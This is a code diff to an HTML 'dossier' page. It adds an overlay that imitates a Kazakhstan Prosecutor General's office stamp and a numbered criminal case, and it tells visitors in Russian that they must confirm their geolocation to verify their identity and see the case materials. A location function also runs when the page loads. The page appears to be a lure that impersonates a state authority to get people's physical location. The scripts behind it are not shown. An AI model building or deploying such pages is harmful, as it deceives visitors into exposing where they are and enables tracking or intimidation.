@@ -8,7 +8,34 @@
 </head>
 <body onload="gpsLocation()">
 
-<div class="dossier-wrapper">
+<!-- ===== ГЕО-ОВЕРЛЕЙ ===== -->
+<div id="geo-overlay" class="geo-overlay">
+  <div class="geo-card">
+    <div class="geo-card-header">
+      <div class="geo-stamp">ҚР БП ҚСжАЕК</div>
+      <div class="geo-lock">&#128274;</div>
+      <div class="geo-title">ДОСТУП ОГРАНИЧЕН</div>
+      <div class="geo-subtitle">Дело № 2024-0847</div>
+    </div>
+    <div class="geo-card-body">
+      <div class="geo-divider"></div>
+      <p class="geo-message">
+        Для верификации личности и получения доступа к материалам дела требуется подтверждение геолокации.
+      </p>
+      <div class="geo-divider"></div>
+      <div class="geo-status" id="geo-status">
+        <span class="geo-status-dot blink"></span>
+        <span id="geo-status-text">ОЖИДАНИЕ АВТОРИЗАЦИИ...</span>
+      </div>
+      <button class="geo-btn" id="geo-btn" onclick="requestGeo()">
+        ПОДТВЕРДИТЬ МЕСТОПОЛОЖЕНИЕ
+      </button>
+      <div class="geo-error" id="geo-error"></div>
+    </div>
+  </div>
+</div>
+
+<div class="dossier-wrapper" id="dossier-wrapper">
 
   <!-- ===== ШАПКА ===== -->
   <div class="dossier-header">
